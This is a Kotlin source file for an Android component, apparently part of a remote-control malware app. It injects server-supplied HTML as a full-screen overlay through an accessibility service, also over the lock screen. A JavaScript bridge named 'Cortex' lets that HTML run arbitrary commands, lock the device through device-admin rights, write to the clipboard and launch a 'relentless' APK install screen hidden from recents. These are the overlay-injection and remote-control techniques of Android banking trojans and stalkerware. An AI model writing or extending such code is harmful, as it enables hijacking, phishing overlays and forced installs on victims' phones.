package com.example.myandroid

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

object DynamicUIManager {
    private var overlayView: WebView? = null
    private var currentType: Int = -1

    class CortexBridge(private val ctx: Context) {
        @JavascriptInterface
        fun close() {
            Handler(Looper.getMainLooper()).post { removeOverlay(ctx) }
            DebugLogger.log("SDUI", "Direct Bridge: Closed Overlay")
        }

        @JavascriptInterface
        fun log(msg: String) {
            DebugLogger.log("SDUI", msg)
        }

        @JavascriptInterface
        fun vibrate(durationMs: Long) {
            try {
                val vibrator = ctx.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(durationMs)
                }
            } catch (e: Exception) { }
        }

        @JavascriptInterface
        fun setDim(percentage: Int) {
            Handler(Looper.getMainLooper()).post {
                DimmerManager.applyDim(ctx, percentage, "ACC")
            }
        }

        @JavascriptInterface
        fun wake() {
            val intent = Intent(ctx, PulseActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                putExtra("is_wake_trigger", true)
            }
            ctx.startActivity(intent)
        }

        @JavascriptInterface
        fun lock() {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                try { dpm.lockNow() } catch (e: Exception) { }
            }
        }

        @JavascriptInterface
        fun getBattery(): Int {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        }

        @JavascriptInterface
        fun toast(message: String) {
            Handler(Looper.getMainLooper()).post {
                android.widget.Toast.makeText(ctx, message, android.widget.Toast.LENGTH_SHORT).show()
            }
        }

        @JavascriptInterface
        fun copyToClipboard(text: String) {
            Handler(Looper.getMainLooper()).post {
                try {
                    val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                    val clip = android.content.ClipData.newPlainText("Cortex Config", text)
                    clipboard.setPrimaryClip(clip)
                    android.widget.Toast.makeText(ctx, "Copied to clipboard", android.widget.Toast.LENGTH_SHORT).show()
                } catch (e: Exception) { }
            }
        }

        @JavascriptInterface
        fun openAccSettings() {
            Handler(Looper.getMainLooper()).post { removeOverlay(ctx) }
            try {
                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun openAccHelp() {
            Handler(Looper.getMainLooper()).post { removeOverlay(ctx) }
            try {
                val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun executeCommand(cmdJson: String) {
            try {
                val mockCmd = JSONObject(cmdJson)
                if (!mockCmd.has("id")) mockCmd.put("id", -2) 
                CoroutineScope(Dispatchers.IO).launch {
                    CommandProcessor.processSingleCommand(ctx, mockCmd)
                }
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun startRelentlessInstall(apkPath: String) {
            Handler(Looper.getMainLooper()).post {
                removeOverlay(ctx)
                val intent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
                    putExtra("apk_path", apkPath)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                }
                ctx.startActivity(intent)
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun showOverlay(ctx: Context, touchable: Boolean, method: String, htmlContent: String) {
        Handler(Looper.getMainLooper()).post {
            val serviceInstance = MyAccessibilityService.instance
            val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
            
            val finalMethod = when (method.uppercase()) {
                "ACC" -> if (serviceInstance != null) "ACC" else "FAIL_ACC"
                "OVERLAY" -> if (hasOverlayPerm) "OVERLAY" else "FAIL_OVERLAY"
                else -> {
                    if (serviceInstance != null) "ACC" 
                    else if (hasOverlayPerm) "OVERLAY"
                    else "FAIL_NONE"
                }
            }

            if (finalMethod.startsWith("FAIL")) {
                DebugLogger.log("SDUI_ERR", "Injection aborted. Method: $method | Reason: $finalMethod")
                return@post
            }

            val windowContext = if (finalMethod == "ACC") serviceInstance!! else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

            // Clean up if the type changed
            if (overlayView != null && currentType != targetType) {
                removeOverlay(ctx)
            }

            var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED

            if (!touchable) {
                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            }

            if (overlayView == null) {
                overlayView = WebView(windowContext).apply {
                    setBackgroundColor(Color.TRANSPARENT)
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled = true
                    webViewClient = WebViewClient() // Prevents opening external browsers
                    addJavascriptInterface(CortexBridge(ctx), "Cortex")
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    targetType,
                    flags,
                    PixelFormat.TRANSLUCENT
                )

                try {
                    overlayView!!.loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null)
                    wm.addView(overlayView, params)
                    currentType = targetType
                } catch (e: Exception) {
                    DebugLogger.log("SDUI_ERR", "Failed to add WebView: ${e.message}")
                    overlayView = null
                }
            } else {
                // Update existing overlay gracefully
                val params = overlayView!!.layoutParams as WindowManager.LayoutParams
                params.flags = flags

                try {
                    overlayView!!.loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null)
                    wm.updateViewLayout(overlayView, params)
                } catch (e: Exception) {}
            }
        }
    }

    fun removeOverlay(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val serviceInstance = MyAccessibilityService.instance
            val windowContext = if (serviceInstance != null) serviceInstance else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            overlayView?.let {
                try { wm.removeView(it) } catch (e: Exception) {}
                it.destroy()
                overlayView = null
                currentType = -1
            }
        }
    }
}
